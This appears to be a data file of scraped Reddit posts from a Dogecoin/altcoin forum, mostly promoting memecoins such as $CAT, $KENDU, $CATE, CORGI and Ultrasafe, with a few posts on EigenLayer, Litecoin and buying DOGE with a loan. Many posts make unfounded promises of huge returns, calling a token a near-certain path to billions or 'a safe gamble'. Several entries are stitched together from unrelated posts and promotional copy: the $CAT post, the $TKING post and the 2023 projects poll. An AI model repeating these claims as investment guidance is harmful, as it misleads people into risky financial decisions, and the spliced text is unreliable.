DOGE,Altcoin,Why I believe $CAT will reach billions ,"It’s a cat season and $CAT (Simon’s Cat) will be the leading coin of this bullrun. Some huge news are coming this month and you definitely do not want to miss this.

The market cap of cat themed memecoins is 10 times lower than the market cap of dog memecoins. This is why I believe we are just a few months away from the biggest cat season ever. And Simon’s Cat will be the leading coin of this meta for sure.

$CAT might look like a basic cat coin but opposite is the truth. The team behind $CAT is experienced, rich and know exactly what to do and how to do it to make this project really reach billions.

And the meme itself definitely deserves billions cause Simon’s Cat is a world-wide known cartoon character + the team is making insane high-quality memes that trend on all their socials.

They already listed $CAT on the majority of the biggest exchanges in the world like OKX, [Gate.io](http://Gate.io), KuCoin or HTX.

And the community is also absolutely insane. With nearly 230k holders, 60k Telegram members and insane 200k X followers. It is just a matter of time until we reach billions because the community members are helping with everything they can to pump their bags and help $CAT go where it belongs.

Worth mentioning is also the fact that the team burned around $25M worth of tokens and made a partnership with FLOKI, one of the biggest memecoins ever.

Honestly, don’t sleep on this. Projects like $CAT do not stay under billion for too long so it is just a matter of time until Binance lists $CAT and it will become one of the biggest memecoins ever.

However, Binance's regulatory challenges might be a concern for some investors.

$BAN has seen significant price jumps, moving from a market cap of $170M to $290M in a short span, showcasing high volatility and interest, which is typical for newly listed cryptocurrencies on major exchanges, Bitget traders made use of this Opportunity. 

BAN was listed on Bitget 20 days (3 weeks) before Binance (Futures) and it has surged significantly creating wealth for those who've bought on Bitget

My total portfolio is in the red by like $40k or so, at this very second I'm typing this.

**Remember, altcoins last cycle had a \~60% correction before prices skyrocketed.**

I saw a post somewhere that had the projected Fibonacci pattern pushing us anywhere between $3-$6 per coin. I'm just adding here and there, so I ca n get to my 350k DOGE goal, at $3 I'd be the first millionaire in my family. I also plan on giving 10% of my earnings away to my local church, and part of it Imma also give some away in higher education scholarships. STAY FOCUSED!

I made my first payment on the loan last Friday, and overall feel alright, although greener days would be nice. I will continue to add about $20-$50 here or there as my budget permits, in the meantime I'm still 300k DOGE strong over here!

DOGE,Altcoin,An Unorthodox Wanted Ad,"This post is exactly what it says as the Wanted Ad is not traditional, BUT it is surely in the right subreddits. It may not be an ad for some people, but I do think my epiphany applies to humans, especially those seeking self improvement. This is especially true if you desire something bigger for your social media footprint.

Overall, to help others improve I would strongly encourage people to find passion/motivation and find a community to support you and lift you up. There is nothing unorthodox about this suggestion. In order to be transparent I want to share that I found both in the most unlikely place and hearing others say how this community has changed the trajectory of their lives for three and a half months now encouraged me to make this post and find the right subreddit to share it. (post was originally for a different audience though wasn’t sure if that was allowed and never heard back from mods)

\*Full Disclosure:\* I have a full time career that I really do love and enjoy. I think I am making a difference in the world and to me that is crucial, BUT this isn’t the community that I am talking about. 

The place that I am suggesting is a memecoin crypto currency community that is organically built and filled with real people from all around the world. If I still have your attention I am going to dig into my why of the Kendu Community and how this could be a path for many people to work on improving their own lives and better themselves in ways they likely would not have imagined. Overall, I am not even suggesting for the main body of this post that you need to buy Kendu and become a holder. You could join the community and work alongside others to help with brand awareness and be lauded as a Legend and a real Chad or Chadette in the community. Buying in does give that extra motivation and inspiration as the idea of working for one’s bag is something big in this crypto project. Being this post is for memecoin/crypto subs, seems a bit silly to suggest not having a bag, but one must do their own actual research and reading. 

There is still a wealth of resources available to learn about Kendu, so you don’t get duped when you hear some one month old account say that Miazaki got scammed twice or you hear that he is going to make a cat coin (yes the recent Spaces are not recorded anymore, but you can join one and step up and ask the questions yourself.

# **Direction and Drive**

Thinking about the fun and the testimonials from members really motivated me to make this post. People in the Telegram are all moving in the same direction. The goal is to promote and grow the brand into an international success story like SHIB and DOGE have done in the past for Crypto. People are all invested (I said you don’t even have to buy in, but naturally changing their financial standing is what has motivated everyone. Everyone must have goals and being invested creates its own inherent goal for each individual and goals are crucial to self improvement) and the shared vision makes it really easy to rally around the work that is done. 

For me I have willingly written multiple Reddit articles, made my first memes, spearheaded  work with StockTwits to grow our presence on that platform and make sure the platform actually worked for us, I have even done massive bike rides (I am much healthier for this aspect of my Kendu ‘work’) around a major city and my local area to place stickers to raise brand awareness,  andI have  even taken my X account from a single account I followed for crypto TA to one that I use for Kendu extensively (blue check mark soon). I haven’t felt this passionate about something in a long long time.

Here are a couple testimonials that really support the realization I had about this community and how it can help the right person to improve themself while channeling their passions and having fun.

[This Chad joined just a bit before I did, but his impact on the community has been monumental. He is a representation of what is really awesome about humanity in so many ways!](https://preview.redd.it/0s9ye7jzqtpd1.jpg?width=1189&format=pjpg&auto=webp&s=69036f45bdeffb5279f6f5a6b85fcd8e17f5a294)

I listened to a number of members come up on the X Spaces and talk about what life was like before Kendu for them and it is fascinating the impact that Kendu has had on so many people. The Developer during X Spaces even encourages new faces to come up and speak ALL THE TIME. He really wants this to happen and it is a tremendously empowering thing to overcome a fear and get up on an X Space (no one can see your face which is really nice for many) and then come back to the Telegram to members complimenting you for overcoming your fear or how well you sounded. This is a place of acceptance and one that provides plenty of opportunities for us to put ourselves in situations to be a little uncomfortable

u/GoodWillShills on X said the other day (Kendu Loyalist and a really great human): 

[CT \(crypto twitter\) is the worst tbhIts going to turn normies to look for a community that they can be accepted in…](https://preview.redd.it/ds8lqxjvqtpd1.png?width=1080&format=png&auto=webp&s=14846b9387116258fda776b1a9675aa0fcc85a0e)

# **Leverage your Passions to Grow the Brand**

 Kendu is an original IP,  but the developer, Kendu Miazaki, doesn't care what you do with the brand. He doesn't own it and if  you want to put KENDU in your video game, make merch, start an energy drink, whatever the community has the freedom to do so. Just don’t double dip. For example There are Kendu shirts on the Merch store and on Amazon now. Clothing is set, but maybe you can make a line of Kendu shoes cause that is your passion. You already have a built in clientele for your product and the community WILL support you!

[Being shipped now and ready for regular ordering I believe](https://preview.redd.it/cnyuirgsqtpd1.png?width=810&format=png&auto=webp&s=ffcaea26d8e578d17e4ee4b33bb7b52b20bda7b8)

People have the freedom to do what they want and it is empowering to leverage your own passion with the common goal of growing the brand which in turn can help change one’s financial status. A community member started the merch store around 1 million market cap and Miazaki has spoken publicly that he doesn’t have time for that and is happy for others to be leaders.

One member is a jewelry maker and he  has created (I think it is almost completely done) a Kendu pendant template. Which he can sell to pay for his hard work. Maybe he will take the profits and put it back into the chart or not, but that doesn’t matter. If you have a great product you want to take to market and you want to use the Kendu brand and are an active member of the community (this is the key, don’t join the telegram and start pitching ideas or your product as it will go really poorly for you) you will have the support of over 10K TG members and over 14K holders. 

https://preview.redd.it/6xgnpopqqtpd1.jpg?width=1189&format=pjpg&auto=webp&s=bcf8adbcac894dec4ca53f4d044743e6a6384dc7

If you really want to grow a YouTube or Tik Tok presence you could easily do so with the support of a strong community thru Kendu content. Take a look at my account. It is saturated with Kendu content mainly and my Karma has grown exponentially because I am as active as I can be. I went from like 5K karma to almost 30K karma now. I will assure you I do not care about that stuff, but it was a nice surprise and one I never thought about.

# **Fun**

This whole idea started because my kids were back to school and I was back to work and things were crazy busy. My body was low on sleep and energy and yet I couldn't resist the pull to jump into the Kendu Telegram to check in and do at least one post. I had an absolute blast in the TG that night. There are a wealth of personalities that exist. We have members from all over the world including: Australia, Denmark, England, Ireland, Germany, Thailand, India, USA (all over), Ghana, Brazil, and Netherlands to name a few. At this point the Telegram has even grown various sub groups with varying interests. Much of the Telegram is hyper focused on sharing to socials and shilling Kendu, but there are certain periods in the course of a day where more hanging out and off topic conversations can and do happen (limited, but true). Another aspect of fun that will inevitably happen is deeper connections are formed  as you are shilling, leveraging your passions. This gives room for side conversations with individuals that you have grown stronger bonds with. While the main Telegram is for work and spreading the brand you will be able to grow strong relationships and connections with others. What is life without human interaction and friendship? Some of my favorite moments are when I am in the Telegram and someone joins who clearly considers themselves an influencer or KOL and said person is looking for Kendu to pay them for promotion services. This is NOT what we do and we do not take kindly to such requests. Watching the community pile onto that person, who clearly did not research about the Kendu whey, is hilarious. YouTube raids are a great joy too and I have really been impressed with the community showing on various crypto focused X Spaces.

\*Background on the Coin:\* Currently there are 10497 members in the TG to support and encourage your growth of the brand. The community has grown organically without paying for KOLs, influencers or any fake upvotes or increases in traffic (it is a seedy world and it does happen for sure in Crypto, def other places too). We have members on all socials/Platforms (Reddit, X, TikTok (need growth), Instagram (need growth), YouTube, and StockTwits. Kendu is an original IP and is the developers last project ever.  If you want to learn more you can find the official Kendu reddit page in my profile (Not breaking the rules cause I can and do read).

If you see this as a path forward to self improvement for you, I encourage you to join the Telegram and lurk for a bit. If admin/Loyalist asks that you prove you are not a bot (bots join all the time and the filters will kick you out/ban you), then just politely tell them you are going to lurk for a bit to learn about the culture and community. I encourage all to lurk and learn about the community and decide what you can do. It has been a blast and has positively impacted so many people’s lives in meaningful ways.

DOGE,Altcoin,Have you joined the pack already?,"I've been diving deep into the meme coin space lately, and I have to say, Kendu Inu ($KENDU) has some massive potential. If you haven't looked into it yet, you might be missing out!

Here’s why I’m bullish on Kendu:

1. Community-Driven Powerhouse: Kendu Inu isn’t just another random meme coin. The Kendu Chads community is growing fast, and they are serious about taking $KENDU to the next level. This isn't just hype—it's a strong, united group of holders committed to driving the project forward. Just check out the Kendu Inu Twitter page to see some of the wild things the community is doing.

2. Active and Transparent Dev Team: The devs behind Kendu Inu are incredibly active on social media and within the community, constantly working on new updates and improvements. Transparency is rare in crypto these days, but these guys are doing it right!

3. Potential for Explosive Growth: We’ve all seen what happened with DOGE and SHIB. When a meme coin gains a strong community and some actual utility, it can go parabolic. Kendu Inu is just getting started, and there’s a lot of room for growth.

TL;DR: If you’re sleeping on $KENDU, now might be the time to wake up. The potential is real, and I’m personally loading up while it’s still under the radar. DYOR as always, but Kendu Inu could be the next big thing! 

Let’s go, Kendu Chads

DOGE,Altcoin,A New Era of Gaming Ownership,"As a gaming enthusiast, I've always been frustrated by the lack of ownership and control over in-game assets, a common limitation with traditional gaming platforms.  
  
This frustration is addressed by Unioverse, a platform built on blockchain technology, which allows players to truly own and control their digital possessions. From characters to entire worlds, players can create, trade, and monetize their in-game assets, marking a significant departure from the traditional gaming model.  
  
One exciting aspect is the ability to build communities and collaborate with others. Unioverse encourages social interaction through guilds, enhancing teamwork and the experience.  
  
In addition to ownership, Unioverse lets players earn real-world value by creating and trading NFTs, a clear shift from traditional gaming lack of financial incentive.  
  
Recent listings on Bitget, KuCoin, and Gate will greatly expand global exposure, while Bitget events, such as PoolX and Candybomb will also help drive adoption, offering chances to earn UNIO Coins and engage with the community.  
  
Overall, Unioverse has the potential to redefine the gaming industry, offering players unmatched ownership, Community and financial opportunities.

DOGE,Altcoin,Pivotal weeks ahead,"$QANX has had a few big runs after the project team goes quiet longer than expected.

In the past, it has always been due to major news.

I think they once again have big updates incoming just as we approach mainnet and hopefully the season is ripe for game changing alts.  

Worth watching for news.  Here's my rundown. 

Qanplatform has long been seeking to deliver a chain that enables:  


\- Smart contracts using any coding language  

\- Signatures that implement post-quantum security 

\- A royalty feature for devs creating reusable code


These are all considered IP in that they are protecting them until they build up market share before they will be open source with the mainnet.  

They have proven they have a working product that delivers the top 2.  Community devs had been hosting their own privatenet where they are demonstrating the capabilities. And the mainnet test has been going for months

On top of that, they have ensured ethereum compatibility, meaning users can keep using tools and wallets they are used to.  And projects can easily migrate.

Also a private/hybrid/public design.

With the ability to code in any language, this will be an easy choice for business to engage in blockchain solutions.  They can start testing a privatenet- for next to nothing - just like the community devs did.  And the hybrid option will really open up use cases for enterprise. 

I think all this combined will create an ecosystem that the old coins have not been able to achieve.

DOGE,Altcoin,"Why does the price always go up or down so sharply?
","I've always wondered, does crypto have eyes and ears on the back of its head?

Like why is it that political events or world events cause the prices to drop suddenly? Or better yet, a high profile individual says something and seemingly in an instant the price goes up or down.

If crypto was truly decentralized, why is it so easily affected by what people or the media says? Why is it like the weather, where we have to forecast it? If it all just computer code, shouldn't it be predictable by the minute? If everyone is buying and holding, why does it suddenly decide to go up or down based off of what happens?

Dogecoin is one, but Bitcoin and all of the others do the same thing...

DOGE,Altcoin,EigenLayer: A Leading Restaking Protocol Empowering Ethereum's Ecosystem,"
EigenLayer is a pioneering restaking protocol built on Ethereum through a series of smart contracts, allowing ETH native stakers to opt in and validate new software modules designed to enhance the Ethereum ecosystem. Since its inception in 2021, EigenLayer has grown significantly, achieving over $15 billion in total value locked (TVL), making it a key player in decentralized finance. The platform’s native token, $EIGEN, is set to launch on May 10, marking a significant step in its development.

In terms of financial backing, EigenLayer has raised more than $64.5 million from leading venture funds like Coinbase Ventures and Polychain Capital. Additionally, the project has formed strategic partnerships with prominent tech foundations such as the Near Foundation, Polyhedra Network, and CELO Foundation. According to DeFiLlama, EigenLayer has become the third-largest DeFi protocol by TVL, trailing only Lido and Aave. The platform enables users to re-stake their Ether or liquid staking tokens (LSTs), allowing them to earn additional yield by securing third-party applications known as Actively Validated Services (AVS).

EigenLayer's tokenomics reflect a strong focus on community growth and long-term sustainability. Of the total 1.67 billion EIGEN token supply, 45% is allocated to community initiatives, 29.5% to investors, and 25.5% to contributors. The allocations for investors and contributors will vest linearly over two years following a one-year cliff. Additionally, 15% of the total EIGEN supply is reserved for airdrops, with 5% available for claim on May 10. Importantly, only direct restakers and users who participate through Liquid Restaking Tokens (LRTs) such as EtherFi’s eETH and Renzo’s ezETH are eligible for this initial claim.

Restaking is a core feature of EigenLayer, allowing stakers to restake their native ETH or LSTs to secure the ecosystem’s services, known as Actively Validated Services (AVS). Operators within EigenLayer are entities that register and run AVS software, allowing stakers to delegate their stakes to them. Stakers can either delegate their staked ETH to operators or choose to run validation services themselves, becoming operators. This double opt-in process ensures that both the operator and the staker agree to the arrangement, with restakers retaining full control over their stakes and deciding which AVS they wish to validate. AVSs are built on EigenLayer’s protocol and leverage Ethereum’s shared security to deliver services to users and the broader Web3 ecosystem, with operators playing a crucial role in maintaining network security and integrity.

As an exciting development, the $EIGEN token will be listed on Bitget starting October 1, once liquidity requirements are met. This marks a significant milestone for EigenLayer, opening up new opportunities for participants and further expanding its influence within the Ethereum ecosystem.

DOGE,Altcoin,"I don't believe that every opportunity is a rip-off; in fact, some of them have the potential to make you quite wealthy.","Many crypto fans have been opposed to investing in meme currencies since they first surfaced in the crypto realm. Analysts cautioned that investing in meme tokens is not always a safe bet. Many people, I was informed, would bet on these coins in the hopes of choosing the next Doge or Shiba, and many of them would be burned. That may be true, but there are more opportunities to invest in and get wealthy now than there have ever been. You may make money by investing in the stock market, real estate, or cryptocurrencies, but in 2021, the most interesting alternative was to invest in Shiba Inu, Doge, or [Mononoke Inu](https://coinmarketcap.com/currencies/mononoke-inu/) meme coins. They demonstrated last year that there was plenty of opportunity for expansion. 

  
Industry representatives stressed the importance of caution when choosing which tokens to invest in and avoiding scams such as ""rug pulls,"" which refers to scenarios in which developers abandon a project and walk away with investors' funds.

When $TKING launched I dropped like $30 into the token for the LOLs because I enjoyed the show. But after the token suddenly gained significantly in the market, I had a look at the fundamentals and what it had to offer.

Even though the token only shot up in value because some people wanted to pump it (Matt Wallace), I found that [Chainchat.app](https://chainchat.app/) was a revolutionary idea. So I added several thousand dollars in coins to my portfolio.

I might be wrong, but this is a true gem and when Chainchat launches out of beta with full escrow services, I could see a world where people would jump on this to trade NFTs, and even tokens.

Players can also earn $GEEK through various in-game activities such as PvP challenges, Guild vs Guild matches, and exploring land dungeons. Additionally, players can discover GEEK boxes and rare NFT assets through the game's build mode.

Now listed on the Bitget exchange, $GEEK is gaining attention for its strong fundamentals and growing play-to-earn economy. To celebrate this, Bitget is hosting a Candybomb event where participants can earn a share of a 3,333,333 $GEEK reward pool. With a unique token economy and a rewarding gameplay experience, $GEEK is certainly one to watch in the secondary market.

DOGE,Altcoin,Ultrasafe #1 viewed on Poocoin. Partnered with UFC Hall of Famer Rashad Evans. His friends include multi-millionaire athletes and entrepreneurs. The partnership is part of something bigger. 3rd audit on the way. Did forget to mention that he’s a close personal friend of Joe Rogan😉,"Rashad Evans is a man of integrity. He's not the guy who would tarnish his credibility for money to shill a random shitcoin. He's made millions. He sees the potential.

This is all part of a larger campaign to get us connected to wealthier potential holders. There are top secret deals being made that are much bigger than this announcement. The devs had to sign NDA for everything. The staking and NFT are getting the finishing touches. They're working on a series of educational videos for potential investors. We have so much more coming down the pipeline. Haters are gonna spread FUD and haters are gonna miss out on a token that’s built for the long term. We ain’t going nowhere. The Ultrasafe mansion has marble no rugs to be pulled here. We don't need any superficial pumps. We know the token will speak for itself when the time comes. We're fine-tuning it to be ready for a bull market. 3rd audit coming not because they have to but because they want to. We’re safe and we can prove it. Devs are hell-bent on being a top 5 altcoin. The community is a tight-knit group. It's made to succeed. There's no excuse not to buy at this cheap price. There are a couple of seats left on the rocket.

DOGE,Altcoin,The Rise of $CATE: The Next Meme Revolution on the Ethereum Blockchain,"
For over a decade, $DOGE has been at the forefront of the meme revolution, capturing the hearts of millions. But now, a new star is on the rise: $CATE. It's time to embrace the future, as $CATE steps into the spotlight, ready to become the largest and most vibrant community on the Ethereum blockchain. Are you ready to join the movement?

Let’s introduce you to the legendary CATE, the pioneering pet of Atsuko Sato fondly known as ""Kabosu Mama."" You may already know Kabosu, the Shiba Inu who became the face of the iconic Doge meme, but before the world fell in love with her, there was CATE. This trailblazing feline has always been a key part of the Sato household and is now ready to make its mark in the crypto space.

CATE isn’t just any cat. As the best friend of $DOGE, this legendary meme feline has stood by its side and now extends a paw of friendship to $NEIRO. With an adventurous spirit and irresistible charm, CATE has leaped onto the Ethereum blockchain, ready to leave its mark on crypto history. Can you feel the excitement?

And here’s the best part: $CATE is now officially listed on Bitget Exchange! To celebrate this huge milestone, Bitget is hosting a Candybomb event. This is your chance to get in on the action and claim your share of 1,920,000 $CATE. Don’t miss out on this opportunity and be a part of the $CATE revolution today!

$CATE - https://www.coingecko.com/en/coins/cate-on-eth",2,2024-09-20 09:27:00,2
DOGE,Altcoin,Could $CATE become the top Cat community meme?,"Is very obvious that dogs and cats are the best friend to human considering these are the most prominent meme communities in the crypto space. Well toad, rabbit, cock, bull etc all tried but Cats and Dogs meme remain top community. The love for this two can be traced to the pioneering pet of Atsuko Sato (Cat and Dog), the dogs inspired Shiba inu and doge. Now, the Cats meme communities are pushing for the exposure of “Cate” known as the Kabosu Mama. They believe that CATE isn't just any cat but a legendary meme feline that has been the best friend to the famous $DOGE and now extends a paw of friendship to $NEIRO.

Currently, $CATE is trending after many top exchanges listed and many more like Bitget have scheduled it listing for 16th. I wonder if this might be the next doge or shiba but considering its tokenomic and total supply I think is worthy to add to watchlist. Also considering this is related to the Sato family will it become the top cat community meme?

DOGE,Altcoin,"I took out a loan to buy more DOGECOIN, Here we go! (Week 3 Update)"," At the time of this post, the current price is around 14.5 cents, a few cents below where I used the loan to purchase 41k more DOGE.(18.5 cents)

My total portfolio is in the red by like $29k bucks or so, at this very second I'm typing this. 

 **Remember, everything last cycle had a \~40% correction before prices skyrocketed.** 

With these current prices, I bought a little more with my recent tax return, and now sit above 300k DOGE in total. It's a beautiful day outside, I muted my crypto app notifications and am just enjoying life.

Onto Week 4! HODL!

DOGE,Altcoin,Exploring Memecoins Across Blockchains: Discovering Hidden Gems,"Yo, let's talk about memecoins on different blockchains! 🌐

So, I've been checking out a few memecoins lately, and here's the scoop:

On Ethereum, you've got some classics like Dogecoin and Shiba Inu. They're like the OGs of the memecoin scene, with huge communities and wild fluctuations.

Then there's Binance Smart Chain (BSC), home to tokens like SafeMoon and Baby Doge. They're all about those crazy reflections and tokenomics.

But you know what's really catching my eye right now? $Powsche on Solana. It's like the underdog of the bunch, but it's got serious potential. The community is super tight-knit, and they're doing some cool stuff with NFTs and charity projects.

Overall, each blockchain has its own vibe when it comes to memecoins. Ethereum for the big names, BSC for the reflections, and Solana for that hidden gem like $Powsche. Definitely worth keeping an eye on! 🚀

DOGE,Altcoin,Wuffi ($WUF): Meme breaking into GameFi,"While Memecoin is basically based on hype and speculation some coins have try to move from that shelf by introducing use case for their project. Shiba, Doge, Pepe and recently Notcoin have all followed this part to ensure sustainability. This is why I feel there is something unique about Wuffi memecoin. The project aims to integrate gaming elements into its ecosystem and give users an exciting experience. The token recently got exposure after Bitget and other exchanges listing. The vision of Wuffi incorporating play-to-earn mechanism, NFT integrations, and potentially a decentralized autonomous organization (DAO) position it as the frontrunner in the burgeoning GameFi sector.

 The vision of blending gaming with blockchain technology is ambitious yet promising. By allowing players to earn $WUF tokens while enjoying interactive experiences, the project is creating a sustainable economic model. Additionally, the integration of NFTs can add a layer of ownership and collectability, enhancing the overall gaming experience and use case for the token.

This vision gives Wuffi the potential to redefine the GameFi and meme space. As the project continues to develop, it will be interesting to see how Wuffi evolves and whether it can live up to its ambitious goals. The price trend after listing is another feature to watch out.

DOGE,Altcoin,$DOG my ultimate conviction.,"Yes, I’ve invested heavily in $DOG and I’m going to shill it…..BUT for good reason.

I believe there’s plenty of $$$ to made for all those who get in soon.  This is NOT some sort of fickle memecoin that will pump and dump.

$DOG is here to stay. It is the No1 memecoin on the No1 blockchain!!!! It’s that simple.

$DOG was also realised fairly and there were no BS team/VC allocations. AND 100% of the tokens are in circulation so NO UNLOCKS .

I really believe this is a no brainer. Each L1 has a leading memecoin but BITCOIN until now hasn’t.

DYOR

I’ve done mine which is why I am so bullish on $DOG

Stop buying rug pull VC/Team benefiting memecoins!!!

DOGE,Altcoin,CORGI might just be the next big thing….,"**CORGI might just be the next big thing….**

Everyone hears stories about the Doge Millionaire and the famous 7000$ shib buy that turned into billions, reminiscing about how they missed their chance and regret it daily.

CORGI IS that next big chance. Buying in today will land you in the millionaire range as we hit the 100m market cap - chump change to meme coins as we have seen recently with Shib, floki, Pepe, and now even Dogwifhat. Those ships have sailed - no matter what you buy in with today, those can’t make you a Millie (market cap alone makes it impossible). Getting in on a low cap with big potential is 100% the way to make 10,000% returns - with a vetted history, locked LP, burned keys and a 100% CERTIK audit… there isn’t a safer gamble out there.

But don’t just take it from me - do your own research, swing by their socials and decide on your own! If you find ANYTHING questionable about the coin, please post here!

DOGE,Altcoin,What do you think about these hyped projects for 2023?," Hello everyone.  


Every once in a while I do some research here and there, to see which crypto projects are more hyped and talked about. Remember, I'm not saying these are good projects or have strong fundamentals, just that I believe they are more hyped than the others. So they can be a good investment, or a bad one.  


This time I found these:  


1. The obvious ones which are almost always hyped: BTC, ETH, BNB, Doge, Matic and ADA. We all know about them, so let's focus mostly on the others.  
2. Polkadot (DOT)  
3. ApeCoin (APE)  
4. Dash 2 Trade (D2T): This one's not still in exchanges, but supposedly it's a strong crypto platform, and hyped.  
5. The Graph (GRT)  
6. NEAR Protocol (NEAR)  
7. Decentraland (MANA)  


So which one of them do you think will perform better in future? If you have any opinion for (or against) anyone of those, I'll be glad to hear it.

⚡️Rewarded in 10% BUSD


💎 THE COIN THAT PAYS TO HOLD💎 

EvaGrow is a deflationary token, the longer you hold the more valuable the coin becomes. EvaGrow holders will earn 10% rewards from every transaction in BUSD, which is automatically sent to your wallets. When the price drops our team will use the buy-back wallet to keep the price growing. 2% of every transaction will be allocated to the buy-back wallet.

EvaGrow is a fork of EverGrow. We are not affiliated with the EverGrow team. The EverGrow model is one of the most successful and best models we've seen on the BSC. Unfortunately a lot of us missed the boat. At over $1bn market cap, the odds of new investors 100x their investment is highly unlikely. So EvaGrow plans to be to EverGrow what Shiba is to Doge.

DOGE,Altcoin,Litecoin is Deep Clucking Value ~ An exhaustive and unreadably long Q&A on the fundamentals of the forever underdog,"

u/noduhcache

—


What follows is not financial advice, quite the opposite.  DYOR is a way of life, an edge for those of us who really practice it.  Smart vs. dumb money isn't professional vs. retail as is often cast (by pros), but DYOR vs. mindless trend follower.  I'm proud of how often these past few years retail has done better research than the so-called pros.  So below you'll see some opinion that's not verifiable, you'll just have to weigh it yourself and you'll see references to adoption and stats that can be verified with your favorite search engine or hard work staring at charts.  DYOR or don't, your call.  

At this and other accounts over the past five years I've come across many of the same questions over and over again, so I'm going to recount the most popular ones here.  The TL;DR is the title.  Litecoin is deep clucking value.  If you want more than that, you have some reading to do, though I will bold a few important parts.  

**Q.** Isn't Litecoin dead?  
**A.** Litecoin as a network is more alive than ever.  On chain transactions, active addresses and volume have thrived relative to the market through bear markets and bull.  Recent stats from Bitpay confirm what can be seen onchain, Litecoin remains one of the most popular altcoins to use.  In just three months after being added, Litecoin beat every altcoin on Bitpay including those that had a 4 year head start to build up their userbase there.  If anyone had told you that would happen, you would have snorted Pepsi through your nose in laughter.  It should tell you something about your priors that it did happen.  

**Q.** How can Litecoin still matter since it's no different than any other low fee currency coin?  
**A.** It's all about the fundamentals.  Lots of coins have some element in common with Litecoin or another, but not one, not even bitcoin, has them all.  The whole is greater than the sum of the parts which is why Litecoin celebrated an 10 year birthday with 100% up time, something no other relevant altcoin has ever done.  It's why it's forgotten more crypto winters than most coins will ever see.  No matter how many times it's declared dead, just like it's big brother, Litecoin will never stop.  

**Q.** Wait a second, there are no fundamentals in crypto.  CNBC said so.  
**A.** Fundamentals don't drive everything in any market, obviously.  And yes, a very large percentage of cryptos are driven entirely by hype, a different set every cycle.  There has to be a new set of pure hype cryptos every cycle because those almost never survive the crypto winter (the one exception is telling, Litecoin's little brother Doge sheltered from the cryptowinter by merged mining with LTC).  The Bitcoin killers came in the first cycle.  In the next cycle there were mostly ICO non-native tokens.  This cycle there are the Ethereum killers and meme tokens.  

But fundamentals are vital to the big three, Bitcoin, Litecoin and Ethereum.  And the key fundamental is network effect.  If you read nothing else today and even if you'll never care about Litecoin, lock in on this truism: Network effect can't be gitcloned.  The longer infrastructure and social norms takes to build, the more expensive the cost of it, the harder it is to tear down.  Hype based coins fade to nothing when the hype fades, tech based coins can have their tech gitcloned by anyone.  Infrastructure based coins keep coming back over and over.    

**Q.** You can't possibly be comparing LTC with BTC and ETH…  
**A.**  That's the league.  4th place isn't even close.  In this space, eth is the smart contracts winner, bitcoin is the store of value winner and Litecoin is the medium of transaction winner.  The real mind blower for a lot of people who desperately want to hate on everything but their favorite coin is that none of these coins compete with each other.  Nor should they try.  As interoperability grows through second layers, this triad will endure not only longer than 99.9% of other cryptos, but longer than most fiat currencies as well, maybe even longer than all of them.  

**Q.** If Litecoin is elite how come I haven't heard anything about it in years?  
**A. Just in recent times, Litecoin has added Paypal, Venmo, Bitpay, Verifone, AMC, Newegg, Interactive Brokers among others and Grayscale announced they're eager to move the popular LTCN trust into a spot ETF as soon as the SEC will allow.  On the development front Omnilite was launched in September, MWEB is finishing up a multiyear development phase with audits and revisions and taproot is on deck.  Litecoin progress is so common, it's not even newsworthy anymore.  Rain is wet, Litecoin is growing, story at 11.**  

There are, of course, competing coin communities that try to shape news stories to exclude the word Litecoin.  Post a thread in the cryptocurrency sub with the word Litecoin in the title, the downvotes come fast and furious (certain times of day, they come even faster).  Post the same story, about say, AMC adding several cryptos and exclude the word Litecoin, and the reaction is far more positive.  So by aggressively downvoting LTC material, other posters even with no dog in the fight, are incentivized to leave out the constantly present Litecoin from their posts, and many people who aren't looking beyond the headlines don't realize Litecoin is in so many of them.  

**Q.** Let's go back, you said no other coin had all of Litecoin's elements, what blend sets it apart?  
**A.** Litecoin's major advantage is network effect, in two parts.  The first part is infrastructure.  Network effects consist of all users, not just people.  Exchanges, payment processors, retailers, software, ATMs, far flung b2b cross border payments in regions with limited/no access to secure, affordable financial services, OTC desks, trusts, ETFs, everything that can be built is part of network effect, and the more it costs to build it, the more durable it tends to be.  Much infrastructure slapped up around new coins today is cheaply gotten and will be quickly lost when hype fades.  

As an aside, something no one here will believe or understand, Litecoin's most important user is Bitcoin.  More on this is another question.  Not Bitcoiners, the people, though the close cultural/development relationship between LTC and BTC helps, but bitcoin the network is a user of Litecoin.  This is a huge part of how Litecoin has thrived all these years and built up so much other antifragile infrastructure.  

The second part of network effect is more obvious, actual people.  All of those infrastructure elements rely on the more  users to maintain them.  If there isn't constant liquidity and volume in good times and bad, as many who've been here through multiple cycles know, coins get delisted and removed.  Many removed coins needed to only provide liquidity to a tiny number of exchanges and still fail.  Litecoin has provided liquidity and volume enough for virtually every exchange, payment processor and other element out there, and has done so consistently over ten years.  The network effect has grown far beyond what second tier alts can fathom.  

Litecoin's minor advantages are more feature based, and many are boring, but also vital to its success.  Quickly, yes, Litecoin is low fee separating it from both Ethereum and Bitcoin.  But it also has world class security in the form of multigenerationally evolved ASICs that are globally distributed on an algo Litecoin is superdominant on, separating it from most other altcoins.  Additionally Litecoin's fair launch, fairly mined status along with its lack of a founder stash separate it massively from the new hype coins which are heavily centralized, and centralization is risk.  

Litecoin's subcent fees are not unique among alts.  It's security and network effect including constant liquidity and healthy volume is not unique among the top three, BTC, LTC, ETH.  Its decentralization is not unique among the top two, BTC is on par.  **But when you piece it all together you have with Litecoin a network unlike any other.**  

**Q.** Ok, time to get back to that weird aside, how can bitcoin as a network be a user of the Litecoin network?  
**A.**  Yes, **Bitcoin is Litecoin's most important user**.  This happens in several ways and the relationship is growing more intertwined as second layers continue to evolve.  

Development synergy has been a big part of this.  Litecoin has in the past been called a testnet for bitcoin.  This was often used as a derogatory term, as testnet coins are valueless.  **The very real advantage that Litecoin offered bitcoin was as a test market, one which not only roughly tested basic functionality of tech as a testnet does, but also tested how market participants, both white hat and black hat, reacted to it.**  You can't really test security on a testnet because the bad guys aren't incentivized to try and break through the security, there's no payoff.  You can't test regulatory reactions or infrastructure partners or a many others because most don't know or care what testnets are.  The only way to see how a real market will really react is to bring the tech to real market participants on a large scale.  Because of Litecoin's constant use and broad infrastructure support, as well as its codebase being kept very close to bitcoin's, it's the perfect test market.  

What many don't realize is that the synergy goes both ways.  Litecoin actually has 100% uptime while Bitcoin is in the 99.98% range because while Litecoin tends to test rare controversial upgrades, like Segwit/lightning and MWEB, on Bitcoin's behalf, Bitcoin is testing all the non-controversial updates for Litecoin, like, most recently, taproot.  So Litecoin uses Bitcoin too.  

